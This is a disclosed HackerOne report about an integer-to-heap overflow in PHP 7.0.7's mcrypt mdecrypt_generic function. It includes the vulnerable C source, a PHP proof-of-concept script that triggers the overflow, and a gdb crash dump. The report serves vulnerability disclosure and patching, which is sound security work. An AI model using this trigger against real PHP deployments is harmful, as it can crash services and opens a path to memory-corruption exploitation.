# Heap Overflow Due To Integer Overflow

## Report Details
- **Report ID**: 146360
- **URL**: https://hackerone.com/reports/146360
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-06-22T02:41:10.357Z
- **Disclosed**: 2019-11-12T09:35:35.784Z

## Reporter
- **Username**: hoangnguyen
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
Bug reported : https://bugs.php.net/bug.php?id=72455

```
PHP_FUNCTION(mdecrypt_generic)
{
    **** snip***
    int block_size, data_size; // signed int
    /* Check blocksize */
    if (mcrypt_enc_is_block_mode(pm->td) == 1) { /* It's a block algorithm */
		block_size = mcrypt_enc_get_block_size(pm->td);
		data_size = ((((int)data_len - 1) / block_size) + 1) * block_size;
		data_s = emalloc(data_size + 1);
		memset(data_s, 0, data_size);
		memcpy(data_s, data, data_len);

    } else { /* It's not a block algorithm */
		data_size = (int)data_len;
		data_s = emalloc(data_size + 1);
		memset(data_s, 0, data_size);
		memcpy(data_s, data, data_len);
	}
```

As you can see data_size follow by formular : data_size = ((((int)data_len - 1) / block_size) + 1) * block_size; because data_size is int. If attacker control data_len for example data_len = 0xffffffff then data_size = 0x20, after that, they will emalloc(0x20) bytes and then use memcpy data to data_s with data_len is 0xffffffff in unsigned int is 4294967295, this leads to heap overflow.

Another code block that lead to integer overflow when check encrypt data is not a block cipher. They just cast data_len from unsigned int to signed int ```data_size = (int)data_len;```, if attacker control data_len = 0xffffffff (in signed int is -1) so that data_size+1 is 0 and pass this value to emalloc, after that they use data_len (is unsigned integer is 4294967295) to copy n bytes data to data_s, this leads to heap overflow again.

Test Script:
```
<?php
	/* Data */
	ini_set('memory_limit',-1);

	$key = str_repeat('C', 32);
	$str = str_repeat('A', 0xffffffff);

	// $td = mcrypt_module_open('des', '', 'ecb', '');
	$td = mcrypt_module_open(MCRYPT_RIJNDAEL_256, '', 'cbc', ''); // block cipher (case 1)
	// $td = mcrypt_module_open('rijndael-256', '', 'ofb', ''); // not block cipher (case 2)

	$ks = mcrypt_enc_get_key_size($td);

	$iv = str_repeat('D', 32);

	if (mcrypt_generic_init($td, $key, $iv) != -1) {
		mcrypt_generic_init($td, $key, $iv);
		$p_t = mdecrypt_generic($td, $str);

		mcrypt_generic_deinit($td);
		mcrypt_module_close($td);
	}
?>
```

Crash:
```
gdb-peda$ r test.php
Starting program: /media/Data/Build/audit/php7.0.7 test.php

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x7ffff427c320 --> 0x0
RBX: 0x0
RCX: 0x8000f427c310
RDX: 0xffe7c2d0
RSI: 0x7ffef3d83d38 ('A' <repeats 200 times>...)
RDI: 0x7ffff43fffc0 ('A' <repeats 64 times><error: Cannot access memory at address 0x7ffff4400000>)
RBP: 0x7fffffffaf50 --> 0x7fffffffaf80 --> 0x7fffffffafb0 --> 0x7fffffffaff0 --> 0x7fffffffb100 --> 0x7fffffffd400 --> 0x7fffffffe780 --> 0x7fffffffe8d0 --> 0x9a0b00 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffaee8 --> 0x64e590 (<zif_mdecrypt_generic+401>:	jmp    0x64e5f2 <zif_mdecrypt_generic+499>)
RIP: 0x7ffff6c2ba0e (<__memcpy_avx_unaligned+830>:	vmovntdq YMMWORD PTR [rdi+0x40],ymm2)
R8 : 0x7ffff427c320 --> 0x0
R9 : 0x0
R10: 0x20 (' ')
R11: 0x7ffff77746e0 (<mcrypt_enc_get_block_size>:	mov    rax,QWORD PTR [rdi+0xc8])
R12: 0x424690 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe9b0 --> 0x2
R14: 0x7ffff4214030 --> 0x7ffff427f5c0 ('A' <repeats 200 times>...)
R15: 0x7ffff427f5c0 ('A' <repeats 200 times>...)
EFLAGS: 0x10203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ffff6c2ba01 <__memcpy_avx_unaligned+817>:	sub    rsi,0xffffffffffffff80
   0x7ffff6c2ba05 <__memcpy_avx_unaligned+821>:	vmovntdq YMMWORD PTR [rdi],ymm0
   0x7ffff6c2ba09 <__memcpy_avx_unaligned+825>:	vmovntdq YMMWORD PTR [rdi+0x20],ymm1
=> 0x7ffff6c2ba0e <__memcpy_avx_unaligned+830>:	vmovntdq YMMWORD PTR [rdi+0x40],ymm2
   0x7ffff6c2ba13 <__memcpy_avx_unaligned+835>:	vmovntdq YMMWORD PTR [rdi+0x60],ymm3
   0x7ffff6c2ba18 <__memcpy_avx_unaligned+840>:	sub    rdi,0xffffffffffffff80
   0x7ffff6c2ba1c <__memcpy_avx_unaligned+844>:	add    rdx,0xffffffffffffff80
   0x7ffff6c2ba20 <__memcpy_avx_unaligned+848>:	jb     0x7ffff6c2b9e0 <__memcpy_avx_unaligned+784>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffaee8 --> 0x64e590 (<zif_mdecrypt_generic+401>:	jmp    0x64e5f2 <zif_mdecrypt_generic+499>)
0008| 0x7fffffffaef0 --> 0x7ffff42141e0 --> 0x0
0016| 0x7fffffffaef8 --> 0x7ffff4214220 --> 0x0
0024| 0x7fffffffaf00 --> 0xfffffda9000000e2
0032| 0x7fffffffaf08 --> 0x2000000020 (' ')
0040| 0x7fffffffaf10 --> 0x7ffff4214280 --> 0x7ffff42010e0 --> 0x900000002
0048| 0x7fffffffaf18 --> 0x7ffef3c00018 ('A' <repeats 200 times>...)
0056| 0x7fffffffaf20 --> 0xfffffff0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
__memcpy_avx_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-avx-unaligned.S:272
272	../sysdeps/x86_64/multiarch/memcpy-avx-unaligned.S: No such file or directory.
gdb-peda$ bt
#0  __memcpy_avx_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-avx-unaligned.S:272
#1  0x000000000064e590 in zif_mdecrypt_generic (execute_data=0x7ffff4214220, return_value=0x7ffff42141e0) at /home/hoangnguyen/Data/Build/audit/php-7.0.7/ext/mcrypt/mcrypt.c:688
#2  0x000000000092cb3e in ZEND_DO_ICALL_SPEC_HANDLER () at /home/hoangnguyen/Data/Build/audit/php-7.0.7/Zend/zend_vm_execute.h:586
#3  0x000000000092c56a in execute_ex (ex=0x7ffff4214030) at /home/hoangnguyen/Data/Build/audit/php-7.0.7/Zend/zend_vm_execute.h:414
#4  0x000000000092c67b in zend_execute (op_array=0x7ffff427e000, return_value=0x0) at /home/hoangnguyen/Data/Build/audit/php-7.0.7/Zend/zend_vm_execute.h:458
#5  0x00000000008cd94a in zend_execute_scripts (type=0x8, retval=0x0, file_count=0x3) at /home/hoangnguyen/Data/Build/audit/php-7.0.7/Zend/zend.c:1427
#6  0x00000000008362ea in php_execute_script (primary_file=0x7fffffffd630) at /home/hoangnguyen/Data/Build/audit/php-7.0.7/main/main.c:2494
#7  0x0000000000995591 in do_cli (argc=0x2, argv=0x115d440) at /home/hoangnguyen/Data/Build/audit/php-7.0.7/sapi/cli/php_cli.c:974
#8  0x000000000099675f in main (argc=0x2, argv=0x115d440) at /home/hoangnguyen/Data/Build/audit/php-7.0.7/sapi/cli/php_cli.c:1344
#9  0x00007ffff6afe830 in __libc_start_main (main=0x995f54 <main>, argc=0x2, argv=0x7fffffffe9b8, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>,
    stack_end=0x7fffffffe9a8) at ../csu/libc-start.c:291
#10 0x00000000004246b9 in _start ()
```

## Attachments
No attachments
